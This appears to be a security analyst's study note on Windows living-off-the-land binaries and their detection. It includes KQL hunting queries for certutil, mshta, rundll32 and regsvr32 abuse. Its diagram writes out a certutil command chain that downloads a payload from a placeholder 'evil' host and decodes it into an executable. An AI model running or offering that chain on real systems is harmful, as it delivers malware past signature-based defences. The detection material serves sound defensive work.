# Living-off-the-Land Binaries (LOLBins)

- [ ] Read
- [ ] Reviewed KQL example
- [ ] Could explain this to someone else

## Why this matters for detection

LOLBins let attackers download and execute payloads using signed, pre-installed Windows binaries — hash-based and signature AV has nothing to flag because the "malware" is a legitimate Microsoft-signed file.

## Core concept

- **`certutil.exe`** — a certificate management tool with a documented but unintended `-urlcache` / `-decode` combo that downloads a file and Base64-decodes it, disguised as routine cert operations.
- **`mshta.exe`** — executes HTA/JScript/VBScript content directly from a URL, bypassing browser download warnings and Mark-of-the-Web prompts entirely.
- **`rundll32.exe`** — runs arbitrary exported functions from a DLL; abused to execute malicious DLLs or run script content via `advpack.dll`/`comsvcs.dll`.
- **`regsvr32.exe`** — the "Squiblydoo" technique registers a COM scriptlet fetched from a remote URL, executing code without ever writing an `.exe` to disk.
- **Why they evade signature AV:** the binary is Microsoft-signed and present on every machine by design; the payload lives in the *arguments/URL*, not the file itself, so hash-based detection is structurally useless here.
- The **[LOLBAS project](https://lolbas-project.github.io/)** catalogs every native Windows binary with a documented abuse technique — treat it as a living reference, not a one-time read.

## Diagram

```
certutil.exe -urlcache -f http://evil/payload.b64 out.txt
certutil.exe -decode out.txt payload.exe
                    │
                    ▼
     Signed binary, unsigned intent — signature AV sees "certutil.exe" and moves on
```

## KQL Example

**Variant A — LOLBin command-line pattern match (broad):**

```kql
DeviceProcessEvents
| where FileName in~ ("certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe")
| where ProcessCommandLine has_any ("urlcache", "http://", "https://", "scrobj.dll", "-decode")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp desc
```

**Variant B — tuned to confirmed network egress by the LOLBin itself:**

Command-line pattern matches alone produce noise from admin scripts referencing URLs without ever connecting. Join against actual observed network activity from the same process for a stronger signal:

```kql
DeviceProcessEvents
| where FileName in~ ("certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe")
| where ProcessCommandLine has_any ("urlcache", "http://", "https://", "scrobj.dll", "-decode")
| join kind=inner (
    DeviceNetworkEvents
    | where InitiatingProcessFileName in~ ("certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe")
    | where RemoteIPType == "Public"
  ) on DeviceId, $left.ProcessId == $right.InitiatingProcessId
| project Timestamp, DeviceName, FileName, ProcessCommandLine, RemoteUrl, RemoteIP
| sort by Timestamp desc
```
